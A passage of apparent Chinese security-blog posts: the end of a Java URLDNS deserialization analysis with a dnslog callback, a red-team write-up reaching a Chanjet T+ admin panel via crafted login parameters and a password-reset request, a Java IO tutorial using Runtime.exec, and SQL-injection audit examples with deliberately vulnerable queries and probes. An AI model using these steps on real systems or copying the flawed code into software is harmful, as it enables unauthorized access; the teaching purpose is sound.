keyword">float</span> ft <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>cap <span class="token operator">*</span> lf<span class="token punctuation">;</span>        threshold <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cap <span class="token operator">&lt;</span> MAXIMUM_CAPACITY <span class="token operator">&amp;&amp;</span> ft <span class="token operator">&lt;</span> MAXIMUM_CAPACITY<span class="token punctuation">)</span> <span class="token operator">?</span>                     <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ft <span class="token operator">:</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Check Map.Entry[].class since it's the nearest public type to</span>        <span class="token comment" spellcheck="true">// what we're actually creating.</span>        SharedSecrets<span class="token punctuation">.</span><span class="token function">getJavaOISAccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">checkArray</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> Map<span class="token punctuation">.</span>Entry<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> cap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"rawtypes"</span><span class="token punctuation">,</span><span class="token string">"unchecked"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> tab <span class="token operator">=</span> <span class="token punctuation">(</span>Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>cap<span class="token punctuation">]</span><span class="token punctuation">;</span>        table <span class="token operator">=</span> tab<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read the keys and values, and put the mappings in the HashMap</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>            K key <span class="token operator">=</span> <span class="token punctuation">(</span>K<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>            V value <span class="token operator">=</span> <span class="token punctuation">(</span>V<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们在57行下个断点，然后点击调试</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221103234915167.png"></p><p>跟进到putVal方法，继续跟进</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221103235234660.png"></p><p>跟进到hash方法</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221103235337127.png"></p><p>当传入的key为空时，返回0，否则执行key.hashcode方法，这里的key为我们传入的url地址：<code>http://6wegpw.dnslog.cn</code>，我们继续跟进到key.hashcode</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221104000147061.png"></p><p>这里的handler是URLStreamHandler的对象，在序列化时会将hashCode的值设为-1，我们跟进到hashCode看看</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221104000936475.png"></p><p>最后通过359行的<code>getHostAddress()</code>方法来发起请求。到此，整个URLDNS链就分析完了。</p><p>这里说个关键的细节，在默认情况下，hashCode的值为-1，当URL对象put到HashMap时，生成序列化payload时会对传入的URL发起一次请求，ysoserial给出的解决方法是重写URLStreamHandler 的 <code>getHostAddress()</code> 方法，使其为空，这样即使hashCode为-1也不会对我们传入的url发起dns请求，然后再通过反射的方式重新将hashCode设置为-1，这样在反序列化时就会对我们传入的url发起请求了。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>URLDNS链的分析算是分析调用链中个人认为最简单的，如果文章有写得不足的地方，还希望师傅们指点下。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>畅捷通js敏感接口登录后台</title>
      <link href="/2022/10/12/chang-jie-tong-js-min-gan-jie-kou-deng-lu-hou-tai/"/>
      <url>/2022/10/12/chang-jie-tong-js-min-gan-jie-kou-deng-lu-hou-tai/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这个系统早期的时候在做攻防演练时遇到的，当时觉得挺有意思便顺手记下了挖掘这个漏洞的过程。</p><h2 id="0x01-漏洞过程"><a href="#0x01-漏洞过程" class="headerlink" title="0x01 漏洞过程"></a>0x01 漏洞过程</h2><p>漏洞地址是：<code>http://xxx.com</code></p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221012023936290.png"></p><p>发现系统管理员账户无法访问。Google 相关漏洞，只能找到这一篇：<code>https://www.anquanke.com/post/id/195226</code>里面提到了几个漏洞：</p><p>1、任意文件上传（利用时间竞争）</p><p>2、管理员密码任意重置漏洞</p><p>3、SQL注入漏洞</p><p>4、接口未授权漏洞</p><p>5、任意文件下载漏洞经过分析，第一个漏洞已经无法使用，访问该目录全都返回200，然后提示无法执行：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221012023452914.png"></p><p>然后仔细看了下页面html代码，发现了这一段：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221012023546638.png"></p><p>尝试构造新的url直接访问：<code>http://xxx.com/tplus/view/login.html?fromApp=b2b&amp;acc=1&amp;role=demo&amp;industry=edu</code>提示：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221012023701912.png"></p><p>虽然提示获取演示账号失败，但是！！发现系统管理员页签可以使用了！！！接着按照文档里面的说法，来重置管理员密码。首先访问重置密码页面：<code>http://xxx.com/tplus/RecoverPassword.aspx</code>在源码中获取到真正的重置页面：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221012023752330.png"></p><p>然后直接构造ajax请求，发送数据包：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221012023832103.png"></p><p>Bingo！密码重置成功，直接登录到后台：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221012023900292.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java之IO流</title>
      <link href="/2022/10/11/java-zhi-io-liu/"/>
      <url>/2022/10/11/java-zhi-io-liu/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>如果你掉进了黑暗里，你能做的，不过是静心等待，直到你的双眼适应黑暗。</p><h2 id="0x01-什么是IO流"><a href="#0x01-什么是IO流" class="headerlink" title="0x01 什么是IO流"></a>0x01 什么是IO流</h2><p>IO是指 Input/Output，即输入和输出。以内存为中心：</p><ul><li>Input 指从外部读入数据到内存，例如把文件从磁盘读取到内存，从网络读取数据到内存等等。</li><li>Output 指把数据从内存输出到外部，例如把数据从内存写入到文件，把数据从内存输出到网络等等。</li></ul><p>Java 代码是在内存中运行的，所以数据也必须读到内存才能对其进行处理，数据在 Java 代码中的最终表示方式无非是 byte数组，字符串等这些 Java 数据类型，都必须存放在内存里。</p><p>从 Java 代码来看，输入实际上就是从外部，例如硬盘上的某个文件，把内容读到内存，并且以 Java 提供的某种数据类型表示，例如，<code>byte[]</code>，<code>String</code>，这样，后续代码才能处理这些数据。因为内存有“易失性”的特点，所以必须把处理后的数据以某种方式输出，例如，写入到文件。Output 实际上就是把 Java 表示的数据格式，例如，<code>byte[]</code>，<code>String</code>等输出到某个地方。</p><p>IO 流是一种顺序读写数据的模式，它的特点是单向流动。数据类似自来水一样在水管中流动，所以我们把它称为IO流。IO流以<code>byte</code>（字节）为最小单位，因此也称为字节流。</p><h2 id="0x02-IO的分类"><a href="#0x02-IO的分类" class="headerlink" title="0x02 IO的分类"></a>0x02 IO的分类</h2><h3 id="1、传输方式"><a href="#1、传输方式" class="headerlink" title="1、传输方式"></a>1、传输方式</h3><p>从数据传输方式或者说是运输方式角度看，可以将 IO 类分为:</p><ul><li>字节流</li><li>字符流</li></ul><p>字节是个计算机看的，字节才是给人看的。简单说下这两者的区别，字节流读取单个字节，字符流读取单个字符(一个字符根据编码的不同，对应的字节也不同，如 UTF-8 编码中文汉字是 3 个字节，GBK编码中文汉字是 2 个字节。)，除了读取的方式不同以外，字节流一般用来处理二进制文件(图片、MP3、视频文件)，而字符流用来处理文本文件(可以看做是特殊的二进制文件，使用了某种编码，人可以阅读)。</p><h3 id="2、数据操作"><a href="#2、数据操作" class="headerlink" title="2、数据操作"></a>2、数据操作</h3><p>从数据来源或者说是操作对象角度看，IO 类可以分为以下几大类</p><ul><li>文件文件(file)：FileInputStream、FileOutputStream、FileReader、FileWriter</li><li>数组([])：字节数组(byte[]): ByteArrayInputStream、ByteArrayOutputStream、字符数组(char[]): CharArrayReader、CharArrayWriter</li><li>管道操作：PipedInputStream、PipedOutputStream、PipedReader、PipedWriter</li><li>基本数据类型：DataInputStream、DataOutputStream</li><li>缓冲操作：BufferedInputStream、BufferedOutputStream、BufferedReader、BufferedWriter</li><li>打印：PrintStream、PrintWriter</li><li>对象序列化反序列化：ObjectInputStream、ObjectOutputStream</li><li>转换：InputStreamReader、OutputStreamWriter</li></ul><h2 id="0x03-关于IO流的常用操作"><a href="#0x03-关于IO流的常用操作" class="headerlink" title="0x03 关于IO流的常用操作"></a>0x03 关于IO流的常用操作</h2><h3 id="1、java-lang-Runtime"><a href="#1、java-lang-Runtime" class="headerlink" title="1、java.lang.Runtime"></a>1、java.lang.Runtime</h3><p>在以往见过的Java命令执行漏洞中，payload经常通过java.lang.Runtime公共类中的exec()方法来执行系统命令，示例代码如下</p><pre><code>import java.io.BufferedReader;import java.io.InputStreamReader;public class TestExec &#123;    public static void main(String[] args) throws Exception &#123;        String line;        String [] cmd=&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;whoami&quot;&#125;;        Process process = Runtime.getRuntime().exec(cmd);        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(),&quot;GBK&quot;));        while((line = reader.readLine()) != null)&#123;            System.out.println(line);        &#125;        reader.close();    &#125;&#125;</code></pre><p>以上代码我们通过getInputStream()读取进程的输入流，再通过InputStreamReader读取字节，进而获取命令执行的结果。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011234213329.png"></p><h3 id="2、FileInputStream"><a href="#2、FileInputStream" class="headerlink" title="2、FileInputStream"></a>2、FileInputStream</h3><p>FileInputStream继承了InputStream类，用于读取文件，我们直接看看它的用法，示例代码如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileRead</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        FileInputStream fs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"D:\\2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//从该输入流读取最多 bytes.length个字节的数据为字节数组。</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011235849280.png"></p><h3 id="3、FileOutputStream"><a href="#3、FileOutputStream" class="headerlink" title="3、FileOutputStream"></a>3、FileOutputStream</h3><p>FileOutputStream继承了OutputStream类，用于写入文件。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileOutput</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"3.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputStream fs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String content <span class="token operator">=</span> <span class="token string">"abcv"</span><span class="token punctuation">;</span>        fs<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>content<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"写入成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>write()从偏移量off开始的指定字节数组中的len个字节写入输出流中。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileOutput</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"4.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputStream fs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String content <span class="token operator">=</span> <span class="token string">"abcv"</span><span class="token punctuation">;</span>        fs<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>content<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//表示写入从下标1到3的字节，即写入bcv到4.txt中</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"写入成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、FileReader"><a href="#4、FileReader" class="headerlink" title="4、FileReader"></a>4、FileReader</h3><p>FileReader类从InputStreamReader类继承而来。该类按字符读取流中数据。它与FileInputStream区别在于FileInputStream提供的是字节流的读取，而非文本读取，这是和FileReader类的根本区别。用FileReader读取出来的是char数组或者String ，使用FileInputStream读取出来的是byte数组。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileReads</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"4.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileReader fr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        fr<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        fr<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221012002037878.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>关于IO流还有很多数据操作，后面有时间再逐一看看。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计之SQL注入</title>
      <link href="/2022/10/11/java-dai-ma-shen-ji-zhi-sql-zhu-ru/"/>
      <url>/2022/10/11/java-dai-ma-shen-ji-zhi-sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​                                                        要对每一个明天怀有恰到好处的期待。</p><h2 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入?"></a>0x01 SQL注入?</h2><p>当请求没有经过严格的过滤的时候，攻击者便可以将一段SQL代码插入到请求中，服务端接受该恶意请求后，便会执行恶意的SQL命令，理论上任何数据交互的请求如果没有经过任何有效的过滤，都会造成SQL注入。</p><p>以下是我在学习java代码审计中遇到的几种可能造成SQL注入的场景。</p><h2 id="0x02-直接动态拼接"><a href="#0x02-直接动态拼接" class="headerlink" title="0x02 直接动态拼接"></a>0x02 直接动态拼接</h2><p>示例代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span>JdbcTemplate jdbcTemplate<span class="token punctuation">;</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/sql"</span><span class="token punctuation">)</span><span class="token keyword">public</span> List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">>></span> <span class="token function">userList</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> String id<span class="token punctuation">)</span><span class="token punctuation">{</span>    String sql <span class="token operator">=</span> <span class="token string">"select * from users where id="</span><span class="token operator">+</span>id<span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">>></span> maps <span class="token operator">=</span> jdbcTemplate<span class="token punctuation">.</span><span class="token function">queryForList</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> maps<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将@RequestParam获取的id拼接在sql语句中，并通过jdbcTemplate.queryForList执行SQL语句，期间没有经过任何的过滤，因此这里存在SQL注入。</p><pre><code>and 1=1</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011015346535.png"></p><pre><code>and 1=2</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011015418217.png"></p><p>用sqlmap也能直接跑出数据库</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011015507113.png"></p><h2 id="0x03-预编译有误"><a href="#0x03-预编译有误" class="headerlink" title="0x03 预编译有误"></a>0x03 预编译有误</h2><p>使用PreparedStatement来执行SQL语句是因为预编译参数化查询能够有效地防止SQL注入，但是由于开发者的个人习惯没有严格按照PreparedStatement的开发方式进行查询，导致在预编译语句中使用了错误的编程方式，同样也会产生注入。</p><p>示例代码</p><pre><code>@RequestMapping(&quot;/vul&quot;)public String vul(@RequestParam(&quot;username&quot;) String username) throws ClassNotFoundException, SQLException &#123;    StringBuilder result = new StringBuilder();    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);    Connection connect = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/java_sec_code?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=true&quot;,&quot;root&quot;,&quot;1q2w3e4r&quot;);    String name = username;    String id = &quot;1&quot;;    String sql = &quot;SELECT * FROM users where id=?&quot;;    sql += &quot;and username like &#39;%&quot;+name+&quot;%&#39;&quot;;    PreparedStatement st = conn.prepareStatement(sql);    st.setString(1,id);    ResultSet rs = st.executeQuery();    while (rs.next()) &#123;        String res_name = rs.getString(&quot;username&quot;);        String res_pwd = rs.getString(&quot;password&quot;);        String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);        result.append(info);    &#125;    rs.close();    connect.close();    return result.toString();    &#125;</code></pre><p>以上代码中虽然参数id做了预编译，但是username却直接进行拼接，这种方式直接导致了SQL注入漏洞的产生。</p><p>用SQLMAP验证SQL注入</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011024813430.png"></p><h2 id="0x04-order-by注入"><a href="#0x04-order-by注入" class="headerlink" title="0x04 order by注入"></a>0x04 order by注入</h2><p>在预编译语句中按照规范也不能彻底防止SQL注入，因为在有些特殊情况下不能使用prepareStatement。order by子句后需要加字段名或者字段位置，而字段名是不能加引号的，否则就会被认为是一个字符串而不是字段名。</p><p>prepareStatement是使用占位符传入参数的，传递的字符都会有单引号包裹，”st.setString(1, id);”会自动加上引号，这样就会导致order by子句失效，这种情况下，智能使用字符拼接的方式，如果要防御SQL注入，就要进行关键字的过滤。</p><p>示例代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/vul"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">jdbc_sqli_sec</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> String id<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException<span class="token punctuation">{</span>    StringBuilder result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>    Connection connect <span class="token operator">=</span> DriverManager<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>    String sql <span class="token operator">=</span> <span class="token string">"select * from users"</span><span class="token operator">+</span><span class="token string">"order by"</span><span class="token operator">+</span>id<span class="token punctuation">;</span>    PreparedStatement st <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    ResultSet rs <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String res_name <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String res_pwd <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String info <span class="token 